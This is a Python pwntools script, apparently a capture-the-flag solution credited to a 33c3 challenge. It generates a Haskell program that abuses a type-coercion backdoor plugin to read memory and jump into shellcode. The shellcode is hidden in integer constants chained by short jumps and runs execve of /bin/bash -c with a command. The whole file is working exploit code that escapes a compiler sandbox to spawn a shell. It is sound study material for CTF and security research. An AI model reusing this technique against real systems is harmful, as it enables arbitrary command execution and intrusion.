#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys, os, tempfile, struct, random, copy

context.arch = 'amd64'

PLUGIN_DIR = "/home/arch/ctf/plugin"
PAYLOAD = "/bin/sh"

### Credit goes to niklasb
### https://github.com/niklasb/33c3ctf-coercive
code_template = '''{{-# LANGUAGE OverloadedStrings, DataKinds, KindSignatures,
  ScopedTypeVariables #-}}
{{-# OPTIONS_GHC -O3 #-}}
import GHC.Types.Backdoor

backdoor :: B1 1337 a -> B2 1337 b
backdoor = id

unsafeCoerce :: a -> b
unsafeCoerce x = unB2 (backdoor $ B1 x)

data Wrap a = Wrap {{ unwrap :: a }}

-- exploit the structure of the closure to read memory
readMem :: Int -> Int
readMem addr = unwrap (unsafeCoerce (addr - 7))

-- TODO: maybe related to trunk evaluation?
-- jmpq *(%rbx)
jmp :: Int -> ()
jmp addr = func (unwrap (unsafeCoerce addr)) `seq` ()

-- `seq` forces strictness on the first argument
-- ... or use BangPatterns for strictness
getAddr :: a -> Int
getAddr x = (y `seq` unsafeCoerce y) - 1
  where y = Wrap x

func :: [Int] -> Int
func [] = 0
func [x] = x
func (x:xs) = func xs

-- hardcoded shellcode function
-- use -O3 to make shellcode compact
hard :: Int -> Int
hard 0 = 1
hard n =
{hardcode}

-- make it a closure so we can jmp to the shellcode
shellcodeAddr :: Int
shellcodeAddr = {address}

caddr :: Int
caddr = getAddr shellcodeAddr

cmdBuf :: String
cmdBuf = "{command}"

strBuf :: String
strBuf = "/bin/bash"

main :: IO ()
main = do
  let x = caddr + 8       -- the address of the integer (which INTLIKE closure encloses)
  print (jmp x)
  y <- getLine
  print cmdBuf            -- ensure these two commands don't get optimized out
  print strBuf
  print $ hard $ read y   -- ensure 'hard' doesn't get optimized out
  return ()
'''

shellcode_template = '''push 0x632d
mov r12, rsp
mov ebx, {}
xor eax, eax
push rax
push rbx
push r12
mov ebx, {}
push rbx
mov rsi, rsp
mov rdi, rbx
push 59
pop rax
xor edx, edx
syscall'''

# find shellcode address & command address
def find_essentials(length):
  # make some magic number in executable
  magics = [random.randint(1 << 30, (1 << 64) - 1) for _ in xrange(length)]
  hs_code = generate_code(magics, PAYLOAD)

  inp = tempfile.mktemp(suffix=".hs")
  with open(inp, 'wb') as f:
    f.write(hs_code)
  oup = tempfile.mktemp()

  # XXX: Ensure the compilation environment is the same as the server's
  cwd = os.getcwd()
  os.chdir(PLUGIN_DIR)
  code = os.system("stack ghc -- -XSafe -XNoForeignFunctionInterface -fplugin GHC.Types.Backdoor.Solver -no-keep-hi-files -no-keep-o-files -Wno-overflowed-literals -o {} {}".format(oup, inp))
  if code != 0:
    raise Exception("Compilation failed!")
  os.chdir(cwd)
  os.unlink(inp)

  binary = ELF(oup)
  sc_address = [next(binary.search(p64(magic))) for magic in magics]
  cmd_address = next(binary.search(PAYLOAD))
  exe_address = next(binary.search("/bin/bash"))
  os.unlink(oup)

  return (sc_address, cmd_address, exe_address)

def make_shellcode(const_addrs, command_addr, binsh_addr):
  shellcode = shellcode_template.format(command_addr, binsh_addr).split('\n')
  codes = map(asm, shellcode)
  
  def fixup(code):
    assert len(code) <= 6
    code = code.ljust(6, '\x90')
    return code 
  codes = map(fixup, codes)

  # append jmp short to the code
  for idx in xrange(len(const_addrs)):
    if idx + 1 == len(const_addrs):
      codes[idx] += '\x90\x90'  # last piece
      break
    codes[idx] += '\xeb'
    codes[idx] += p8(const_addrs[idx + 1] - (const_addrs[idx] + 8))
  
  # turn it into u64
  result = map(u64, codes)
  return result

def generate_code(shellcodes, command, pc=0x41414141):
  hardcode = ''
  sc = copy.deepcopy(shellcodes)
  sc.reverse()
  for idx in xrange(len(sc)):
    hardcode += '  '
    hardcode += '0x%x' % sc[idx]
    hardcode += ' * hard (n - '
    hardcode += str(len(sc) - idx + 1)
    hardcode += ') '
    if idx != len(sc) - 1:
      hardcode += '+'
    hardcode += '\n'
  return code_template.format(command=command, hardcode=hardcode, address=pc)

def main():
  log.info("Extracting essential info from binary...")
  consts, command_addr, binsh_addr = find_essentials(len(shellcode_template.split('\n')))

  log.info("Making shellcode...")
  shellcode = make_shellcode(consts, command_addr, binsh_addr)

  log.info("Generating exploit...")
  exploit_code = generate_code(shellcode, PAYLOAD, consts[0])
  with open("./Exploit.hs", 'wb') as f:
    f.write(exploit_code)

  log.info("Done!")
  return 0

if __name__ == '__main__':
  sys.exit(main())

